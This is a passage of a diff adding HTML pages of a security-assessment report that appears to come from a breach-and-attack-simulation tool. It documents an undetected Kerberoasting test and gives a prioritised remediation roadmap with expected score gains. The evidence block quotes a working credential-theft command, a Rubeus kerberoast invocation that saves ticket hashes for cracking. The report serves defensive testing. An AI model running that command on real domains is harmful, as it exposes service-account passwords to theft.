+    </div>
+  </div>
+
+  <!-- HIGH 2 -->
+  <div class="fc fc-high">
+    <div class="fc-header">
+      <div class="fc-sev-block high">&#9650; HIGH</div>
+      <div class="fc-heading">
+        <div class="fc-name">Kerberoasting (No Elevation Required)</div>
+        <div class="fc-tid">T1558.003 &nbsp;·&nbsp; Tactic: Credential Access &nbsp;·&nbsp; Framework: Atomic Red Team</div>
+      </div>
+      <div class="fc-verdict"><span class="vb vb-missed">&#10007; EVADED</span></div>
+    </div>
+    <div class="fc-body">
+      <div class="fc-grid">
+        <div>
+          <div class="fc-detail-row"><div class="fc-detail-label">What Happened</div><div class="fc-detail-value">Rubeus executed an SPN query requesting Kerberos service tickets for cracking. Ran at standard user privilege. No detection from SIEM, EDR, or domain controller alerting.</div></div>
+          <div class="fc-detail-row"><div class="fc-detail-label">Business Impact</div><div class="fc-detail-value">Any domain user can perform this. Extracted ticket hashes can be cracked offline to recover service account passwords — often privileged, rarely rotated.</div></div>
+          <div class="fc-detail-row"><div class="fc-detail-label">Executed As</div><div class="fc-detail-value"><span class="priv-badge priv-user">USER</span> &nbsp; Standard domain user — NO elevation</div></div>
+          <div class="fc-detail-row"><div class="fc-detail-label">Detection</div><div class="fc-detail-value" style="color:#dc2626">None — Kerberos event monitoring not configured on DC</div></div>
+        </div>
+        <div>
+          <div class="evidence-block">
+            <div class="ev-header">Evidence</div>
+            <div class="ev-row"><div class="ev-key">Command</div><div class="ev-val code">Rubeus.exe kerberoast /outfile:hashes.txt</div></div>
+            <div class="ev-row"><div class="ev-key">Executed As</div><div class="ev-val warn">USER (no elevation)</div></div>
+            <div class="ev-row"><div class="ev-key">Exit Code</div><div class="ev-val ok">0 (success)</div></div>
+            <div class="ev-row"><div class="ev-key">Duration</div><div class="ev-val">4,103 ms</div></div>
+            <div class="ev-row"><div class="ev-key">DC Event</div><div class="ev-val bad">4769 logged but not alerted</div></div>
+            <div class="ev-row"><div class="ev-key">Cleanup</div><div class="ev-val ok">✓ Hash file deleted</div></div>
+          </div>
+        </div>
+      </div>
+      <div class="fc-remediation">
+        <div class="fc-rem-label">&#9654; Recommended Fix — Effort: 8 hours</div>
+        <div class="fc-rem-text">Implement <strong>Group Managed Service Accounts (gMSA)</strong> for all service accounts — these use 240-character auto-rotating passwords that cannot be cracked from Kerberos tickets. Enable alerting on Event ID 4769 (Kerberos Service Ticket Request) with Encryption Type 0x17 (RC4) — legitimate services use AES; RC4 requests from non-service accounts are highly suspicious. Consider Microsoft ATA or Defender for Identity for automated Kerberoasting detection.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pf">
+    <span>Audspect BAS &nbsp;·&nbsp; Run ID: run-18ba273d &nbsp;·&nbsp; Assessment ID: ASM-2026-0628</span>
+    <span>Generated by Audspect BAS v1.7.1 &nbsp;·&nbsp; CONFIDENTIAL</span>
+    <span>Page 7 of 12</span>
+  </div>
+</div>
+</div>
+
+
+<!-- ══════════════════ REMEDIATION ROADMAP ══════════════════ -->
+<div class="page">
+<div class="inner">
+  <div class="ph">
+    <div class="ph-left">
+      <div class="ph-logo">Aud<span>spect</span> BAS</div>
+      <div class="ph-sep"></div>
+      <div class="ph-title">APT36 Kill-Chain + Selective ART</div>
+    </div>
+    <div class="ph-right">
+      <div class="ph-endpoint">WIN-PROD-01 &nbsp;·&nbsp; Production</div>
+      <div class="ph-class">CONFIDENTIAL</div>
+      <div class="ph-page">Page 8 / 12</div>
+    </div>
+  </div>
+
+  <div class="stag">Section 6</div>
+  <div class="stitle">Remediation Roadmap</div>
+  <p style="font-size:0.79rem;color:#6e7681;margin-bottom:14px">Prioritised action plan. Full implementation expected to raise Prevention Score to 89% and Detection Score to 88%.</p>
+
+  <div class="roadmap">
+    <div class="rm-lane">
+      <div class="rm-header" style="background:#dc2626">&#9889; Immediate — 0 to 7 days</div>
+      <div class="rm-body">
+        <div class="rm-item"><div class="rm-bullet" style="background:#dc2626">1</div><div>Enable <strong>LSA Protection (RunAsPPL)</strong> registry key. Blocks LSASS memory reads from all processes including SYSTEM — closes T1003.001 immediately.</div></div>
+        <div class="rm-item"><div class="rm-bullet" style="background:#dc2626">2</div><div>Enable <strong>Windows Credential Guard</strong> via Group Policy. Hardware-isolated credential storage. Required: UEFI Secure Boot + TPM 2.0 (already present on WIN-PROD-01).</div></div>
+        <div class="rm-item"><div class="rm-bullet" style="background:#dc2626">3</div><div>Raise or remove the <strong>AV file-size scan limit</strong> in the endpoint security console policy. Enable cloud ML scanning as backup — closes T1027.001.</div></div>
+        <div class="rm-item"><div class="rm-bullet" style="background:#dc2626">4</div><div>Block <strong>outbound network from regsvr32.exe</strong> via Windows Firewall GPO rule — closes T1218.010 SCT download vector immediately.</div></div>
+      </div>
+    </div>
+    <div class="rm-lane">
+      <div class="rm-header" style="background:#d97706">&#9650; Short-Term — 8 to 30 days</div>
+      <div class="rm-body">
+        <div class="rm-item"><div class="rm-bullet" style="background:#d97706">5</div><div>Enable <strong>Microsoft ASR rules</strong> (Audit first 48 hrs, then Enforce) for LOLBAS abuse: Block Office child processes, Block obfuscated script execution.</div></div>
+        <div class="rm-item"><div class="rm-bullet" style="background:#d97706">6</div><div>Enable <strong>Kerberos Event 4769 alerting</strong> on all Domain Controllers for RC4 ticket requests from non-service accounts — closes T1558.003 detection gap.</div></div>
+        <div class="rm-item"><div class="rm-bullet" style="background:#d97706">7</div><div>Enable <strong>SMB signing enforcement</strong> via GPO — closes T1021.002 relay attack vector. Verify no legacy systems break before enforcement.</div></div>
+        <div class="rm-item"><div class="rm-bullet" style="background:#d97706">8</div><div>Tune EDR <strong>lateral movement behavioral rules</strong> for RDP anomaly detection — reduce MTTD on T1021.001 from 6.1s to &lt;2s.</div></div>
+      </div>
+    </div>
+    <div class="rm-lane">
+      <div class="rm-header" style="background:#0d9488">&#10003; Strategic — 31 to 90 days</div>
+      <div class="rm-body">
+        <div class="rm-item"><div class="rm-bullet" style="background:#0d9488">9</div><div>Migrate all service accounts to <strong>Group Managed Service Accounts (gMSA)</strong> — permanently eliminates Kerberoasting as a viable attack path.</div></div>
+        <div class="rm-item"><div class="rm-bullet" style="background:#0d9488">10</div><div>Deploy <strong>SIEM detection rules</strong> for all 7 missed techniques using ATT&amp;CK data source mappings — verify each rule fires on next BAS run.</div></div>
+        <div class="rm-item"><div class="rm-bullet" style="background:#0d9488">11</div><div>Schedule <strong>monthly BAS runs</strong> against a Defense Evasion-focused scenario to track ASR rule effectiveness over time.</div></div>
+        <div class="rm-item"><div class="rm-bullet" style="background:#0d9488">12</div><div>Implement <strong>Privileged Access Workstations (PAW)</strong> for all admin activity — reduces lateral movement blast radius.</div></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="sh2">Expected Score Improvement</div>
+  <table>
+    <thead><tr>
+      <th>Metric</th>
+      <th style="color:#dc2626">Current</th>
+      <th>After 7 days</th>
+      <th>After 30 days</th>
+      <th>After 90 days</th>
+    </tr></thead>
+    <tbody>
+      <tr class="sim-row-now">
+        <td class="sim-bold">Prevention Score</td>
+        <td style="color:#d97706;font-weight:800">71%</td>
+        <td style="color:#0d9488;font-weight:700">79%</td>
+        <td style="color:#0d9488;font-weight:700">85%</td>
+        <td style="color:#0d9488;font-weight:700">89%</td>
+      </tr>
+      <tr>
+        <td class="sim-bold">Detection Score</td>
+        <td style="color:#d97706;font-weight:800">58%</td>
+        <td style="color:#d97706;font-weight:700">62%</td>
+        <td style="color:#0d9488;font-weight:700">76%</td>
+        <td style="color:#0d9488;font-weight:700">88%</td>
+      </tr>
+      <tr>
+        <td class="sim-bold">Undetected Techniques</td>
+        <td style="color:#dc2626;font-weight:800">7</td>
+        <td style="color:#d97706;font-weight:700">5</td>
+        <td style="color:#d97706;font-weight:700">3</td>
+        <td style="color:#0d9488;font-weight:700">1</td>
+      </tr>
+      <tr>
+        <td class="sim-bold">Risk Score</td>
+        <td style="color:#d97706;font-weight:800">42 / Medium</td>
+        <td style="color:#0d9488;font-weight:700">31 / Low</td>
+        <td style="color:#0d9488;font-weight:700">24 / Low</td>
+        <td style="color:#0d9488;font-weight:700">17 / Low</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="pf">
+    <span>Audspect BAS &nbsp;·&nbsp; Run ID: run-18ba273d &nbsp;·&nbsp; Assessment ID: ASM-2026-0628</span>
+    <span>Generated by Audspect BAS v1.7.1 &nbsp;·&nbsp; CONFIDENTIAL</span>
+    <span>Page 8 of 12</span>
+  </div>
+</div>
+</div>
+
+</body>
+</html>
